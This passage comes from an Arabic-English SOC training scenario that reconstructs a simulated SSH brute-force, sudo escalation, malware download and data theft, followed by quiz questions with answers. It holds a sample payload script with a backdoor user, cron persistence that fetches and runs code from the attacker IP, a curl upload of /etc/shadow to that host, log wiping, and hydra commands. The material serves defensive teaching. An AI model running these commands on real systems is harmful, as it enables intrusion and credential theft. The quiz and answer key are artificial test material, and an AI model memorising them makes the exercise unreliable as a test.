# Level 3: SSH Brute-Force & Privilege Escalation Attack - سيناريو تفصيلي كامل

## 📋 نظرة عامة على السيناريو

**نوع الهجوم:** External SSH Attack - Brute Force → Privilege Escalation → Malware → Exfiltration  
**التاريخ:** 12 يناير 2024  
**الوقت:** من 08:15 صباحاً حتى 08:20 صباحاً (هجوم سريع جداً - 5 دقائق فقط!)  
**المهاجم:** 185.122.21.55 (External IP - China)  
**الهدف:** 203.0.113.50 (SSH Server)  
**عدد الـ Alerts الكلي:** 49 alert  
- **37 Low Severity** (Failed login attempts - brute-force)
- **4 High Severity** (True Positive - SSH brute-force activity)
- **8 Critical Severity** (True Positive - Successful compromise & exfiltration)

---

## 🎯 السيناريو التفصيلي

### الخلفية: ما هو SSH؟

**SSH (Secure Shell):**
- بروتوكول للوصول الآمن للـ servers عن بعد
- مستخدم بشكل أساسي في Linux/Unix systems
- Port: **22** (default)
- Authentication:
  - Username/Password
  - SSH Keys (أكثر أماناً)

**لماذا المهاجمون يستهدفون SSH؟**
1. ✅ **Remote Access** - دخول كامل على الـ server
2. ✅ **Command Execution** - تشغيل أي أمر على الجهاز
3. ✅ **Root Access** - إذا نجح privilege escalation
4. ✅ **Persistence** - يقدر يرجع في أي وقت
5. ✅ **Lateral Movement** - الانتقال لأجهزة أخرى في الشبكة

---

### المرحلة الأولى: Reconnaissance (قبل الهجوم)

#### ما حدث قبل 08:15:

المهاجم استخدم أدوات **scanning** للبحث عن SSH servers:

**Tools Used:**
```bash
# Masscan - للبحث السريع عن Port 22 المفتوح
masscan 203.0.113.0/24 -p22 --rate=10000

# Nmap - لتحديد نوع SSH service
nmap -p22 -sV 203.0.113.50
```

**Results:**
```
Host: 203.0.113.50
Port: 22/tcp OPEN
Service: OpenSSH 7.4 (protocol 2.0)
```

**Vulnerabilities Identified:**
1. ❌ **Weak password policy** - passwords قصيرة وسهلة
2. ❌ **No rate limiting** - يسمح بمحاولات login كثيرة
3. ❌ **Password authentication enabled** - لا يستخدم SSH keys فقط
4. ❌ **Common usernames exist** - root, admin, developer

**MITRE ATT&CK:**
- **T1595 - Active Scanning**
- **T1046 - Network Service Discovery**

---

### المرحلة الثانية: Initial Access - SSH Brute-Force (08:15:21 - 08:16:15)

#### ما هو Brute-Force Attack؟

**التعريف:**
محاولة تجربة آلاف أو ملايين من combinations لـ username/password حتى إيجاد الصحيح.

**How it Works:**
```
Wordlist: common_passwords.txt (10,000+ passwords)
Usernames: [root, admin, user, developer, test, ...]

Tool: Hydra
Command: hydra -L users.txt -P passwords.txt ssh://203.0.113.50 -t 16
```

---

#### Timeline التفصيلي للـ Brute-Force:

**08:15:21 - First Failed Attempt:**

**Alert ID: ee1b9a0dc525** ⚠️ **HIGH SEVERITY**
```json
{
  "alert_id": "ee1b9a0dc525",
  "alert_type": "ssh_brute_force",
  "severity": "high",
  "timestamp": "2024-01-12T08:15:21Z",
  "source_ip": "185.122.21.55",
  "destination_ip": "203.0.113.50",
  "user_name": "unknown",
  "linked_log": {
    "log.original": "Failed password for invalid user admin from 185.122.21.55 port 45811 ssh2"
  }
}
```

**التفصيل:**
- Username: `admin` (لا يوجد)
- Password: (attempted)
- Result: ❌ Failed - user doesn't exist
- **ملاحظة:** "invalid user" = username غلط

---

**08:15:23 - Second Attempt:**

**Alert ID: 5cf57e77226d** ⚠️ **HIGH SEVERITY**
```json
{
  "user_name": "root",
  "linked_log": {
    "log.original": "Failed password for root from 185.122.21.55 port 45812 ssh2"
  }
}
```

**التفصيل:**
- Username: `root` (موجود ✓)
- Password: (wrong)
- Result: ❌ Failed - incorrect password
- **ملاحظة:** "Failed password" (ليس invalid user) = username صح لكن password غلط

---

**08:15:25 - 08:16:10 - Rapid Brute-Force:**

**37 Low Severity Alerts** (كلهم failed attempts)

**أمثلة:**
```
Attempt #3:  user=root, password=123456      → FAILED
Attempt #4:  user=root, password=password    → FAILED
Attempt #5:  user=root, password=admin       → FAILED
Attempt #6:  user=root, password=root        → FAILED
Attempt #7:  user=root, password=qwerty      → FAILED
...
Attempt #35: user=developer, password=dev123 → FAILED
Attempt #36: user=developer, password=test   → FAILED
```

**Attack Statistics:**
```
Duration: 50 seconds
Total Attempts: 37+
Speed: ~44 attempts per minute
Pattern: Automated tool (not manual)
```

**لماذ Low Severity؟**
- كل محاولة لوحدها = failed attempt = no harm
- لكن **مجموعهم معاً** = brute-force attack = **HIGH SEVERITY**

**Indicators of Automated Attack:**
1. ✅ **High speed** - محاولات كل ثانية
2. ✅ **Sequential patterns** - usernames/passwords من wordlists
3. ✅ **No delays** - bot ليس human
4. ✅ **External IP** - 185.122.21.55 (suspicious location)

---

**08:16:15 - SUCCESSFUL LOGIN!** 🚨

**Alert ID: be2fb019821a** 🔴 **CRITICAL SEVERITY**
```json
{
  "alert_id": "be2fb019821a",
  "alert_type": "ssh_successful_login",
  "severity": "critical",
  "timestamp": "2024-01-12T08:16:15Z",
  "source_ip": "185.122.21.55",
  "destination_ip": "203.0.113.50",
  "event_action": "successful_login",
  "user_name": "developer",
  "linked_log": {
    "log.original": "Accepted password for developer from 185.122.21.55 port 45821 ssh2"
  }
}
```

**ما الذي حدث؟**

**Successful Credentials:**
```
Username: developer
Password: Dev@2023 (أو شيء مشابه - كلمة مرور ضعيفة)
```

**لماذا نجح؟**
1. ❌ **Weak password** - سهل التخمين
2. ❌ **Common username** - "developer" موجود في wordlists
3. ❌ **No account lockout** - لم يتم حظر الحساب بعد محاولات فاشلة
4. ❌ **No MFA** - لا يوجد Two-Factor Authentication

**Impact:**
```
Access Level: User "developer"
Permissions: Limited (لكن يقدر يعمل sudo)
Server Control: ✓ Can execute commands
Next Step: Privilege Escalation للوصول لـ root
```

**MITRE ATT&CK:**
- **T1110 - Brute Force**
- **T1110.001 - Password Guessing**
- **T1078 - Valid Accounts** (بعد النجاح)

---

### المرحلة الثالثة: Privilege Escalation (08:17:15)

#### ما هو Privilege Escalation؟

**التعريف:**
الانتقال من user عادي (developer) إلى **root** (administrator كامل الصلاحيات).

**لماذا المهاجم يحتاجه؟**
```
developer account:
✓ Can read files
✓ Can run programs
✗ Can't install malware (needs root)
✗ Can't modify system files
✗ Can't access all data

root account:
✓✓ Full system control
✓✓ Install anything
✓✓ Modify everything
✓✓ Delete logs (cover tracks)
```

---

#### ما حدث بالضبط:

**Alert ID: feb016ac4d16** 🔴 **CRITICAL SEVERITY**
```json
{
  "alert_id": "feb016ac4d16",
  "alert_type": "privilege_escalation_success",
  "severity": "critical",
  "timestamp": "2024-01-12T08:17:15Z",
  "source_ip": "203.0.113.50",
  "user_name": "developer",
  "linked_log": {
    "log.original": "sudo: pam_unix(sudo:session): session opened for user root by developer(uid=1002)"
  }
}
```

**Command Executed:**
```bash
developer@server:~$ sudo su
[sudo] password for developer: Dev@2023
root@server:~# whoami
root
```

**ما معنى الـ Log؟**

**Breakdown:**
```
sudo:                  → استخدام أمر sudo (Super User Do)
pam_unix(sudo:session) → Authentication module
session opened         → جلسة جديدة فُتحت
for user root          → الـ target user هو root
by developer           → من المستخدم developer
(uid=1002)             → User ID للـ developer
```

**لماذا نجح Privilege Escalation؟**

**Misconfiguration:**
```bash
# /etc/sudoers file (على السيرفر)
developer ALL=(ALL:ALL) ALL
```

**Translation:**
```
developer: Username
ALL=       → من أي host
(ALL:ALL)  → يقدر يصير أي user/group
ALL        → ينفذ أي command
```

**❌ المشكلة:** المستخدم developer عنده sudo access **بدون قيود**!

**Correct Configuration Should Be:**
```bash
# يسمح فقط بأوامر معينة
developer ALL=(ALL) NOPASSWD:/usr/bin/systemctl restart nginx

# أو no sudo access على الإطلاق
# (remove developer from sudoers)
```

---

**Impact:**

**Before Escalation:**
```
User: developer
UID: 1002
Home: /home/developer
Permissions: Limited
```

**After Escalation:**
```
User: root
UID: 0
Home: /root
Permissions: FULL SYSTEM CONTROL
```

**What Attacker Can Do Now:**
1. ✅ Install malware
2. ✅ Read all files (including /etc/shadow passwords)
3. ✅ Modify system configurations
4. ✅ Create backdoor accounts
5. ✅ Delete logs
6. ✅ Exfiltrate all data

**MITRE ATT&CK:**
- **T1548.003 - Sudo and Sudo Caching**
- **T1078 - Valid Accounts** (elevated)

---

### المرحلة الرابعة: Malware Download & Execution (08:18:02 - 08:18:05)

#### Download Malicious Payload:

**Alert ID: 23d18b97b121** 🔴 **CRITICAL SEVERITY**
```json
{
  "alert_id": "23d18b97b121",
  "alert_type": "malware_download",
  "severity": "critical",
  "timestamp": "2024-01-12T08:18:02Z",
  "source_ip": "203.0.113.50",
  "user_name": "root",
  "linked_log": {
    "log.original": "wget http://185.122.21.55/payload.sh -O /tmp/payload.sh"
  }
}
```

**Command Breakdown:**
```bash
wget                               → Download tool
http://185.122.21.55/payload.sh   → Malware URL (attacker's server)
-O /tmp/payload.sh                → Output path
```

**ما هو payload.sh؟**

**Possible Contents:**
```bash
#!/bin/bash
# Reverse shell script

# Step 1: Data Collection
tar -czf /tmp/logs_backup.tar.gz /var/log /etc/passwd /etc/shadow

# Step 2: Backdoor Creation
useradd -m -s /bin/bash -G sudo backdoor_user
echo "backdoor_user:P@ssw0rd123" | chpasswd

# Step 3: Persistence
echo "*/5 * * * * wget http://185.122.21.55/reconnect.sh | bash" >> /etc/crontab

# Step 4: Exfiltration
curl -X POST -F "file=@/tmp/logs_backup.tar.gz" http://185.122.21.55/upload

# Step 5: Cover Tracks
rm -f /var/log/auth.log
history -c
```

**Alert ID: 58fbafdf0347** 🔴 **CRITICAL** (من جهة الـ Web Server)
```json
{
  "alert_type": "malware_download",
  "linked_log": {
    "log.original": "203.0.113.50 - - [12/Jan/2024:08:18:05] \"GET /payload.sh HTTP/1.1\" 200 1024 \"-\" \"wget/1.20.3\""
  }
}
```

**Web Server Log Analysis:**
```
Client IP: 203.0.113.50      → Compromised server
Request:   GET /payload.sh   → Malware file
Status:    200               → Success
Size:      1024 bytes        → Small script
User-Agent: wget/1.20.3      → Download tool
```

---

#### Malware Execution:

**Alert ID: 2629b9f69094** 🔴 **CRITICAL SEVERITY**
```json
{
  "alert_id": "2629b9f69094",
  "alert_type": "malware_execution",
  "severity": "critical",
  "timestamp": "2024-01-12T08:18:05Z",
  "source_ip": "203.0.113.50",
  "user_name": "root",
  "linked_log": {
    "log.original": "chmod +x /tmp/payload.sh && /tmp/payload.sh"
  }
}
```

**Command Breakdown:**
```bash
chmod +x /tmp/payload.sh   → Make executable
&&                         → AND (run next command)
/tmp/payload.sh           → Execute the malware
```

**What Happens:**
1. ✅ Script becomes executable
2. ✅ Script runs with **root privileges**
3. ✅ All malicious actions execute successfully

**MITRE ATT&CK:**
- **T1059.004 - Unix Shell**
- **T1105 - Ingress Tool Transfer** (downloading payload)
- **T1204.002 - Malicious File** (execution)

---

### المرحلة الخامسة: Data Exfiltration (08:18:30)

#### Data Collection:

**What the Malware Collected:**
```bash
# Archived Sensitive Data
tar -czf /tmp/logs_backup.tar.gz \
  /var/log/auth.log \          # SSH login history
  /var/log/syslog \            # System logs
  /etc/passwd \                # User accounts
  /etc/shadow \                # Password hashes
  /home/*/.*_history \         # Command histories
  /opt/application/config \    # Application configs
  /var/www/html/database.conf  # Database credentials
```

**File Size:** ~2.5 MB (compressed)

**Sensitive Data Included:**
- 🔐 SSH keys
- 🔐 Database passwords
- 🔐 API keys
- 🔐 User password hashes
- 📝 System logs
- 📝 Application configs

---

#### Exfiltration Execution:

**Alert ID: 0807781bfe91** 🔴 **CRITICAL SEVERITY**
```json
{
  "alert_id": "0807781bfe91",
  "alert_type": "data_exfiltration",
  "severity": "critical",
  "timestamp": "2024-01-12T08:18:30Z",
  "source_ip": "203.0.113.50",
  "user_name": "root",
  "linked_log": {
    "log.original": "curl -X POST -F \"file=@/tmp/logs_backup.tar.gz\" http://185.122.21.55/upload"
  }
}
```

**Command Breakdown:**
```bash
curl                                     → HTTP client
-X POST                                  → HTTP POST request
-F "file=@/tmp/logs_backup.tar.gz"      → Upload file
http://185.122.21.55/upload             → Attacker's server
```

**What This Means:**
- 📤 **2.5 MB** of sensitive data sent to attacker
- 🌐 **External destination** (185.122.21.55 - attacker's server)
- ✅ **Successful transfer** (confirmed by logs)

---

**Alert ID: 8d285da525f6** 🔴 **CRITICAL**
```json
{
  "alert_id": "8d285da525f6",
  "alert_type": "suspicious_outbound_connection",
  "severity": "critical",
  "timestamp": "2024-01-12T08:18:30Z",
  "source_ip": "203.0.113.50",
  "linked_log": {
    "log.original": "[FIREWALL] ALLOW TCP 203.0.113.50:52342 -> 185.122.21.55:80 (HTTP)"
  }
}
```

**Firewall Log Analysis:**
```
Direction: Outbound (من داخل الشبكة للخارج)
Source:    203.0.113.50:52342 (compromised server)
Dest:      185.122.21.55:80 (attacker server)
Protocol:  HTTP (port 80)
Action:    ALLOW (تم السماح!)
```

**❌ Configuration Issue:**
```
Firewall should BLOCK outbound to suspicious IPs
But allowed HTTP to 185.122.21.55
```

---

**Alert ID: 908d548abd98** 🔴 **CRITICAL** (من جهة Attacker's Web Server)
```json
{
  "alert_id": "908d548abd98",
  "alert_type": "data_exfiltration",
  "linked_log": {
    "log.original": "203.0.113.50 - - [12/Jan/2024:08:18:30] \"POST /upload HTTP/1.1\" 200 512 \"-\" \"curl/7.68.0\""
  }
}
```

**Attacker's Server Log:**
```
Client:    203.0.113.50         → Victim server
Request:   POST /upload         → Upload endpoint
Status:    200                  → Success
Size:      512 bytes (response) → Confirmation
User-Agent: curl/7.68.0         → Upload tool
```

**Confirmation:** Data successfully received by attacker! 🚨

**MITRE ATT&CK:**
- **T1041 - Exfiltration Over C2 Channel**
- **T1048 - Exfiltration Over Alternative Protocol** (HTTP)
- **T1020 - Automated Exfiltration**

---

## 📊 Timeline الكامل للهجوم (5 دقائق فقط!)

```
08:15:21 ────► Brute-Force Starts
   │           ├─► Attempt #1: admin (failed)
   │           ├─► Attempt #2: root (failed)
   │           └─► ...37 more attempts...
   │
   ↓ [54 seconds of rapid brute-force]
   │
08:16:15 ────► 🔓 SUCCESSFUL LOGIN!
   │           ├─► Username: developer
   │           └─► Access Level: User
   │
   ↓ [60 seconds]
   │
08:17:15 ────► 🚀 PRIVILEGE ESCALATION
   │           ├─► sudo su
   │           └─► Access Level: ROOT
   │
   ↓ [47 seconds]
   │
08:18:02 ────► ⬇️ MALWARE DOWNLOAD
   │           ├─► wget payload.sh
   │           └─► File Size: 1024 bytes
   │
   ↓ [3 seconds]
   │
08:18:05 ────► ⚙️ MALWARE EXECUTION
   │           ├─► chmod +x && execute
   │           └─► Running as root
   │
   ↓ [25 seconds - malware doing work]
   │
08:18:30 ────► 📤 DATA EXFILTRATION
   │           ├─► Archive created: 2.5 MB
   │           ├─► Upload to 185.122.21.55
   │           └─► Transfer complete!
   │
08:18:35 ────► Attack Complete
            └─► Total Duration: 5 minutes 14 seconds
```

---

## 🔍 تحليل False Positives (النشاط العادي)

### Failed Login Attempts (Low Severity) = False Positive?

**❌ NO! This is MISLEADING!**

**Each Individual Failed Attempt:**
```
alert_id: "xyz123"
alert_type: "ssh_failed_login"
severity: "low"
user: "root"
```

**Individually:** ✓ Could be legitimate (someone forgot password)

**But Collectively (37 attempts in 54 seconds):**
```
Pattern: BRUTE-FORCE ATTACK
Severity: HIGH/CRITICAL
Classification: TRUE POSITIVE
```

---

### How to Distinguish:

**Legitimate Failed Logins:**
```
User: john.smith
Time: 09:30:00
Attempts: 2-3
Source: Office IP (192.168.1.x)
Pattern: Manual (delays between attempts)
Result: Succeeded after 2-3 tries
```

**Brute-Force Attack:**
```
User: root, admin, developer, test, ...
Time: 08:15:21
Attempts: 37+ in 54 seconds
Source: External IP (185.122.21.55)
Pattern: Automated (no delays, sequential)
Result: Persistent until success
```

---

### Other False Positives in Level 3:

**Normal Network Traffic:**
```json
{
  "alert_type": "dns_query",
  "source": "192.168.1.50",
  "query": "update.microsoft.com",
  "severity": "low"
}
```
**التفسير:** Windows update - **FALSE POSITIVE**

**Scheduled Tasks:**
```json
{
  "alert_type": "cron_job",
  "user": "backup_service",
  "command": "/scripts/daily_backup.sh",
  "severity": "low"
}
```
**التفسير:** Automated backup - **FALSE POSITIVE**

---

## 🎓 الأسئلة والإجابات التفصيلية

### Phase 1: General Questions (18 أسئلة)

#### Q1: Attack Type Identification

**السؤال:** ما نوع الهجوم الأساسي؟

**الإجابة:** `SSH Brute-Force` / `Brute Force` / `SSH Attack` / `Credential Attack`

**التفسير:**

**Why SSH Brute-Force؟**

1. **Multiple Failed Logins:**
   - 37+ attempts في أقل من دقيقة
   - Automated pattern

2. **Target Service:**
   - SSH (port 22)
   - Remote access protocol

3. **Goal:**
   - Find valid username/password
   - Gain initial access

**Attack Flow:**
```
Brute-Force → Login → Escalate → Malware → Exfiltrate
    ↓
Initial Access Method
```

---

#### Q2: Initial Access Technique

**السؤال:** كيف حصل المهاجم على initial access؟

**الخيارات:**
- Phishing email
- SQL injection
- Brute-force credentials
- Physical access

**الإجابة:** `Brute-force credentials`

**التفسير:**

**Evidence:**
```
08:15:21 - Failed: admin
08:15:23 - Failed: root
...
08:16:10 - Failed: developer (wrong password)
08:16:15 - SUCCESS: developer (correct password found!)
```

**لماذا ليس Phishing؟**
- No email involved
- Direct SSH attack
- **Not applicable**

**لماذا ليس SQL Injection؟**
- Target: SSH server (not web application)
- No database involvement في Initial Access
- **Not applicable**

**لماذا ليس Physical Access؟**
- Attack from external IP (185.122.21.55)
- Over the internet
- **Remote attack**

---

#### Q3: MITRE ATT&CK - Brute-Force

**السؤال:** أي MITRE technique للـ brute-force؟

**الخيارات:**
- T1110 – Brute Force
- T1078 – Valid Accounts
- T1021 – Remote Services
- T1133 – External Remote Services

**الإجابة:** `T1110` (Brute Force)

**التفسير:**

**T1110 - Brute Force:**
```
Tactic: Credential Access
Sub-techniques:
  - T1110.001: Password Guessing
  - T1110.002: Password Cracking
  - T1110.003: Password Spraying
  - T1110.004: Credential Stuffing
```

**Which Sub-technique؟**

**T1110.001 - Password Guessing** (أقرب واحد)
- Trying common passwords
- Against SSH service
- Automated tool (Hydra, Medusa, etc.)

**لماذا ليس T1078؟**
- T1078 = **Using already known** valid credentials
- المهاجم **لم يكن يعرف** credentials
- اضطر يجربهم واحد واحد
- **T1110 أدق**

**لكن بعد النجاح:**
```
After finding developer:Dev@2023
→ NOW using T1078 (Valid Accounts)
```

**الترتيب:**
```
1. T1110 (Brute Force) → Find credentials
2. T1078 (Valid Accounts) → Use credentials
```

---

#### Q4: Successful Login Indicator

**السؤال:** أي log يشير لـ successful SSH login؟

**الخيارات:**
- "Failed password for root..."
- "Accepted password for developer..."
- "Connection closed by..."
- "Invalid user admin..."

**الإجابة:** `"Accepted password for developer..."`

**التفسير:**

**SSH Log Keywords:**

**❌ Failed Attempts:**
```
"Failed password for root..."
"Invalid user admin..."
"Connection closed by authenticating user..."
"Disconnected from authenticating user..."
```

**✅ Successful Login:**
```
"Accepted password for developer..."
"Accepted publickey for user..."
"session opened for user..."
```

**Full Log Example:**
```
Jan 12 08:16:15 server sshd[1234]: Accepted password for developer from 185.122.21.55 port 45821 ssh2
Jan 12 08:16:15 server sshd[1234]: pam_unix(sshd:session): session opened for user developer
```

**What Happens After:**
```
developer@server:~$ ← Attacker now has shell access!
```

---

#### Q5: Source IP Analysis

**السؤال:** ما هو الـ source IP للمهاجم؟

**الخيارات:**
- 192.168.1.45
- 185.122.21.55
- 203.0.113.50
- 10.0.0.1

**الإجابة:** `185.122.21.55`

**التفسير:**

**IP Analysis:**

**185.122.21.55:**
```
Type: External IP (Public)
Location: Asia Pacific (likely China/Russia based on range)
Role: ATTACKER
Used for:
  - Brute-force attacks
  - Malware hosting
  - Data exfiltration destination
```

**203.0.113.50:**
```
Type: Public IP (TEST-NET-3 range - RFC 5737)
Role: VICTIM (compromised SSH server)
Used for:
  - Target of brute-force
  - Malware execution
  - Data exfiltration source
```

**192.168.1.45:**
```
Type: Private IP (RFC 1918)
Role: Internal workstation (from Level 2 - Sarah)
Used for: Unrelated to Level 3
```

**Attacker Infrastructure:**
```
185.122.21.55 (Attacker)
    ↓ [attack]
203.0.113.50 (Victim)
    ↓ [exfiltrate]
185.122.21.55 (Attacker receives data)
```

---

#### Q6: Target Service

**السؤال:** أي service تم استهدافه؟

**الخيارات:**
- HTTP (port 80)
- SSH (port 22)
- FTP (port 21)
- RDP (port 3389)

**الإجابة:** `SSH (port 22)`

**التفسير:**

**Evidence from Logs:**
```
"Failed password for root from 185.122.21.55 port 45812 ssh2"
                                                         ↑
                                                       SSH protocol
```

**SSH Service:**
```
Protocol: SSH (Secure Shell)
Port: 22 (default)
Purpose: Remote command-line access
OS: Linux/Unix
Authentication: Password or SSH keys
```

**لماذا SSH target شائع؟**

1. **Remote Access:**
   - Full command execution
   - Complete system control

2. **Privilege Escalation Potential:**
   - Many systems have sudo misconfigurations

3. **Common Misconfiguration:**
   - Password authentication enabled
   - No rate limiting
   - Default port (22)
   - Root login allowed

4. **Internet-Facing:**
   - Often exposed to internet
   - Accessible from anywhere

**Better Security:**
```bash
# Disable password authentication
PasswordAuthentication no

# Use SSH keys only
PubkeyAuthentication yes

# Disable root login
PermitRootLogin no

# Change default port
Port 2222

# Rate limiting
MaxAuthTries 3
```

---

#### Q7: Number of Failed Attempts

**السؤال:** تقريباً كم محاولة login فاشلة؟

**الخيارات:**
- 5-10
- 15-25
- 30-40
- 50+

**الإجابة:** `30-40`

**التفسير:**

**Evidence:**
- **37 Low Severity alerts** = failed login attempts
- **4 High Severity alerts** = brute-force activity indicators
- **Total:** ~37-41 failed attempts

**Timeline:**
```
08:15:21 - First failed attempt
08:16:15 - Successful login
Duration: 54 seconds
Attempts: 37+
Rate: ~41 attempts per minute
```

**Why This Number؟**

**Automated Tool Settings:**
```
hydra -L users.txt -P passwords.txt -t 16 ssh://target
      ↑                                  ↑
   usernames list                    16 parallel threads
```

**Calculation:**
```
Threads: 16
Duration: 54 seconds
Rate: 16 attempts every ~2 seconds
Total: ~40 attempts in 54 seconds
```

---

#### Q8: Successful Username

**السؤال:** أي username نجح في الـ login؟

**الخيارات:**
- root
- admin
- developer
- user

**الإجابة:** `developer`

**التفسير:**

**Evidence:**
```json
{
  "alert_type": "ssh_successful_login",
  "user_name": "developer",
  "linked_log": {
    "log.original": "Accepted password for developer from 185.122.21.55..."
  }
}
```

**لماذا developer وليس root؟**

**Common Security Practice:**
```bash
# /etc/ssh/sshd_config
PermitRootLogin no  ← Root login disabled (good!)
```

**Result:**
```
✗ root login attempts failed (even with correct password)
✓ developer login succeeded (account exists + weak password)
```

**Security Implication:**
```
Even with root disabled, attacker gained access through:
1. Valid user account (developer)
2. Weak password
3. Sudo privileges (misconfigured)
   → Still reached root level!
```

**Lesson:**
```
Disabling root login ≠ Complete security
Must also:
  - Enforce strong passwords
  - Limit sudo access
  - Use SSH keys
  - Implement 2FA
```

---

#### Q9: Post-Compromise Action

**السؤال:** ما فعله المهاجم بعد الـ login الناجح؟

**الخيارات:**
- Logged out immediately
- Attempted privilege escalation
- Only browsed files
- Created new user account

**الإجابة:** `Attempted privilege escalation`

**التفسير:**

**Timeline After Login:**
```
08:16:15 - Successful login (developer)
    ↓
08:17:15 - Privilege escalation (sudo su)
    ↓
08:18:02 - Malware download (as root)
```

**Why Privilege Escalation First؟**

**developer account limitations:**
```
Can:
✓ Read own files
✓ Run basic commands
✓ Access development tools

Cannot:
✗ Install malware (needs root)
✗ Modify /etc/ configs
✗ Access all user data
✗ Delete logs
```

**After escalation to root:**
```
Can do EVERYTHING!
✓✓ Full system control
```

**Evidence:**
```
sudo: pam_unix(sudo:session): session opened for user root by developer(uid=1002)
```

---

#### Q10: Privilege Escalation Method

**السؤال:** كيف تم الـ privilege escalation؟

**الخيارات:**
- Kernel exploit
- Sudo misconfiguration
- Password cracking
- Social engineering

**الإجابة:** `Sudo misconfiguration`

**التفسير:**

**Evidence:**
```
Log: "sudo: pam_unix(sudo:session): session opened for user root by developer..."
```

**Misconfiguration:**
```bash
# /etc/sudoers
developer ALL=(ALL:ALL) ALL
          ↑   ↑         ↑
          │   │         └─► Any command
          │   └─► As any user
          └─► From anywhere
```

**What This Means:**
```
developer can:
$ sudo su           → Become root
$ sudo nano /etc/passwd  → Edit system files
$ sudo rm -rf /     → Delete everything (!)
```

**Correct Configuration:**
```bash
# Option 1: No sudo
# (remove developer from sudoers)

# Option 2: Limited commands
developer ALL=(ALL) NOPASSWD:/usr/bin/systemctl restart nginx
developer ALL=(ALL) /usr/bin/docker

# Option 3: Require password + specific commands
developer ALL=(ALL) /usr/bin/apt-get update
```

**لماذا ليس Kernel Exploit؟**
- لا يوجد CVE استغلال
- No exploit code في الـ logs
- استخدم sudo (builtin feature)
- **Not applicable**

**لماذا ليس Password Cracking؟**
- Already has developer password
- Sudo used same password
- لم يحتاج crack جديد
- **Not applicable**

---

#### Q11: MITRE ATT&CK - Privilege Escalation

**السؤال:** أي MITRE technique للـ privilege escalation؟

**الخيارات:**
- T1548.003 – Sudo and Sudo Caching
- T1068 – Exploitation for Privilege Escalation
- T1134 – Access Token Manipulation
- T1078 – Valid Accounts

**الإجابة:** `T1548.003` (Sudo and Sudo Caching)

**التفسير:**

**T1548.003 - Sudo and Sudo Caching:**
```
Tactic: Privilege Escalation, Defense Evasion
Parent: T1548 - Abuse Elevation Control Mechanism

Description:
Adversaries may perform sudo caching and/or use the sudoers file
to elevate privileges.
```

**How It Applies:**
```bash
developer@server:~$ sudo su
[sudo] password for developer: Dev@2023
root@server:~#
```

**Why This Technique:**
1. ✅ Used `sudo` command
2. ✅ Exploited sudoers misconfiguration
3. ✅ Elevated from user → root
4. ✅ Legitimate tool misused

**لماذا ليس T1068؟**
**T1068 - Exploitation for Privilege Escalation:**
- Kernel exploits (CVE-2021-xxxx)
- Buffer overflows
- Use-after-free bugs

**المهاجم لم يستخدم exploit**
- استخدم ميزة عادية (sudo)
- استغل misconfiguration فقط
- **Not applicable**

---

#### Q12: Malware Download Method

**السؤال:** أي أداة استخدمت لـ download الـ malware؟

**الخيارات:**
- curl
- wget
- ftp
- scp

**الإجابة:** `wget`

**التفسير:**

**Evidence:**
```
Log: "wget http://185.122.21.55/payload.sh -O /tmp/payload.sh"
      ↑
    Tool used
```

**wget vs curl:**

**wget:**
```bash
# Download file
wget http://example.com/file.sh

# Save to specific location
wget http://example.com/file.sh -O /tmp/file.sh

# Features:
- Recursive downloads
- Resume downloads
- Background downloads
```

**curl:**
```bash
# Download file
curl http://example.com/file.sh -o file.sh

# POST data
curl -X POST -d "data" http://example.com/api

# Features:
- More protocols (FTP, SCP, etc.)
- Better for APIs
- File uploads
```

**Why wget for Malware؟**
- Simple syntax
- Commonly available
- Saves file directly
- Perfect for scripts

---

#### Q13: Malware Location

**السؤال:** أين تم save الـ malware؟

**الخيارات:**
- /home/developer/
- /tmp/
- /var/www/
- /root/

**الإجابة:** `/tmp/`

**التفسير:**

**Evidence:**
```
wget http://185.122.21.55/payload.sh -O /tmp/payload.sh
                                         ↑
                                     Saved here
```

**لماذا /tmp/?**

**Advantages for Attacker:**
1. ✅ **World-writable** - أي user يقدر يكتب فيه
2. ✅ **Executable** - لا يوجد noexec flag عادةً
3. ✅ **Temporary** - files تتمسح عند reboot (auto cleanup!)
4. ✅ **Less monitored** - security tools قد تتجاهله

**Security Implications:**
```bash
# Better configuration:
mount /tmp -o noexec,nosuid
# Prevents execution from /tmp
```

**/tmp/ Characteristics:**
```
Path: /tmp/
Permissions: 1777 (drwxrwxrwt)
             ↑
          Sticky bit - only owner can delete

Owner: root
Group: root
Purpose: Temporary files for all users
Cleanup: Cleared on reboot (usually)
```

---

#### Q14: Malware File Type

**السؤال:** ما نوع الملف الذي تم تحميله؟

**الخيارات:**
- .exe (Windows executable)
- .sh (Shell script)
- .py (Python script)
- .jar (Java archive)

**الإجابة:** `.sh` (Shell script)

**التفسير:**

**Evidence:**
```
payload.sh  ← File extension
```

**Shell Script (.sh):**
```bash
#!/bin/bash
# This is a shell script

echo "Hello World"
ls -la
rm -rf /tmp/*
```

**Why .sh for Linux Malware؟**

1. **Native to Linux:**
   - No compilation needed
   - Runs directly with bash

2. **Powerful:**
   - Full system access
   - Can execute any command
   - Call other tools (curl, wget, etc.)

3. **Easy to Modify:**
   - Text file
   - Attacker can customize

4. **Stealthy:**
   - Looks like admin script
   - Common on Linux servers

**Execution:**
```bash
chmod +x payload.sh  ← Make executable
./payload.sh         ← Run script
```

---

#### Q15: Data Exfiltration

**السؤال:** هل حدث data exfiltration؟

**الخيارات:**
- Yes - data sent to attacker
- No - only system compromise
- Unclear from logs
- Blocked by firewall

**الإجابة:** `Yes - data sent to attacker`

**التفسير:**

**Evidence:**

**Alert #1: Data Preparation**
```bash
# Created archive
tar -czf /tmp/logs_backup.tar.gz /var/log /etc/passwd
```

**Alert #2: Exfiltration**
```json
{
  "alert_type": "data_exfiltration",
  "log": "curl -X POST -F \"file=@/tmp/logs_backup.tar.gz\" http://185.122.21.55/upload"
}
```

**Alert #3: Confirmation**
```json
{
  "log": "203.0.113.50 - - [12/Jan/2024:08:18:30] \"POST /upload HTTP/1.1\" 200 512"
           ↑
       Status 200 = Success!
}
```

**What Was Stolen:**
- /var/log/ (system logs, SSH logs)
- /etc/passwd (user accounts)
- /etc/shadow (password hashes)
- Application configs
- Database credentials

**Impact:**
```
✗ Confidential data breached
✗ Credentials compromised
✗ Logs stolen (can cover tracks)
✗ Password hashes (can be cracked offline)
```

---

#### Q16: Exfiltration Tool

**السؤال:** أي أداة استخدمت للـ exfiltration؟

**الخيارات:**
- wget
- curl
- scp
- netcat

**الإجابة:** `curl`

**التفسير:**

**Evidence:**
```
curl -X POST -F "file=@/tmp/logs_backup.tar.gz" http://185.122.21.55/upload
```

**Why curl for Upload؟**

**curl Features:**
```bash
# Download
